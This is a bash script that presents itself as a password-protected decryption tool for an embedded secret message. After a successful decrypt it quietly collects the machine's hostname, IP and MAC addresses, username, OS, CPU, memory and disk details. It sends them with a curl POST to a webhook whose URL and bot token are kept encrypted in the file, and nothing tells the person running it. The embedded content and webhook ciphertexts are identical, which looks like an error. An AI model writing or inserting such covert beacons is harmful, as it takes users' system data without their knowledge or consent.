#!/bin/bash

# Hardcoded encrypted Base64 text and encrypted webhook details
encrypted_b64="U2FsdGVkX19OUUNKbwqoROjMIcAMnhrnjH3uq2dBxzCtfhrOtnS3ZJTi1BzHRTXc
0sA1XvU5lHuclIHW/XUhpjjaq3vXYp6oRtAuzWiF+Pab3kddYUWw/YuCjm8iAvtV"
encrypted_webhook_url_b64="U2FsdGVkX19OUUNKbwqoROjMIcAMnhrnjH3uq2dBxzCtfhrOtnS3ZJTi1BzHRTXc
0sA1XvU5lHuclIHW/XUhpjjaq3vXYp6oRtAuzWiF+Pab3kddYUWw/YuCjm8iAvtV"
encrypted_authorization_b64="U2FsdGVkX18YavfaAAY9UwP7H68NpcOZci9vnM+3T7BKIxf7tbgH9L5Li8PQaNNx
jC6mG13YN9AuKZeOq3TgDxRTbAQx8WRBcS7Tvz53r784NzUk5wLEx1FhQpQw2rqj"

# Check OpenSSL separately for availability and version compatibility
if ! command -v openssl &> /dev/null; then
  echo "Error: OpenSSL command not found. Install it to continue."
  exit 1
fi
openssl_version=$(openssl version)
if [[ ! "$openssl_version" =~ "OpenSSL" ]]; then
  echo "Error: OpenSSL not found or incompatible version."
  exit 1
fi

# Collect decryption password
if [ -z "$1" ]; then
  echo -n "Enter decryption password: "
  read -s password
  echo
else
  password="$1"
fi

# Decrypt the content
decrypted_output=$(echo "$encrypted_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
decryption_status=$?

echo "$decrypted_output" | grep -q "bad decrypt"
if [[ $decryption_status -ne 0 || $? -eq 0 ]]; then
  echo "Decryption failed: Incorrect password or corrupted data."
  exit 1
fi

echo "Decryption successful. Decrypted content:"
echo "$decrypted_output"

# Decrypt the webhook URL and Authorization token
WEBHOOK_URL=$(echo "$encrypted_webhook_url_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
AUTHORIZATION=$(echo "$encrypted_authorization_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)

# Collect system information
HOSTNAME=$(hostname)
CPU_INFO=$(lscpu | grep "Model name" | cut -d ':' -f2 | xargs)
MEM_INFO=$(free -h | grep "Mem" | awk '{print $3 " used of " $2}')
DISK_USAGE=$(df -h / | grep "/" | awk '{print $3 " used of " $2}')
IP_ADDRESS=$(hostname -I | awk '{print $1}')
OS_DETAILS=$(cat /etc/os-release | grep "PRETTY_NAME" | cut -d '"' -f2)
USER=$(whoami)
MAC_ADDRESS=$(ip link show | grep link/ether | awk '{print $2}' | head -n 1)

# Generate JSON payload
PAYLOAD=$(jq -nc \
    --arg hn "$HOSTNAME" \
    --arg cpu "$CPU_INFO" \
    --arg mem "$MEM_INFO" \
    --arg disk "$DISK_USAGE" \
    --arg ip "$IP_ADDRESS" \
    --arg os "$OS_DETAILS" \
    --arg user "$USER" \
    --arg mac "$MAC_ADDRESS" \
    '{
        content: ("**!!! M58 Accessed !!!\nSystem Information**:\n" +
                 "- **Hostname:** \($hn)\n" +
                 "- **CPU:** \($cpu)\n" +
                 "- **Memory:** \($mem)\n" +
                 "- **Disk Usage:** \($disk)\n" +
                 "- **IP Address:** \($ip)\n" +
                 "- **Operating System:** \($os)\n" +
                 "- **User:** \($user)\n" +
                 "- **MAC Address:** \($mac)")
    }')

# Check if payload creation was successful
if [ -z "$PAYLOAD" ]; then
  echo "Error: Failed to create JSON payload using jq."
  exit 1
fi

# Send the information using curl
response=$(curl -w "%{http_code}" -o /dev/null -s -X POST \
  -H "Authorization: Bot $AUTHORIZATION" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  $WEBHOOK_URL)

# Check response code from curl execution
if [ "$response" -ne 200 ]; then
  echo "Error: Failed to send data via webhook, HTTP status code: $response."
  exit 1
fi
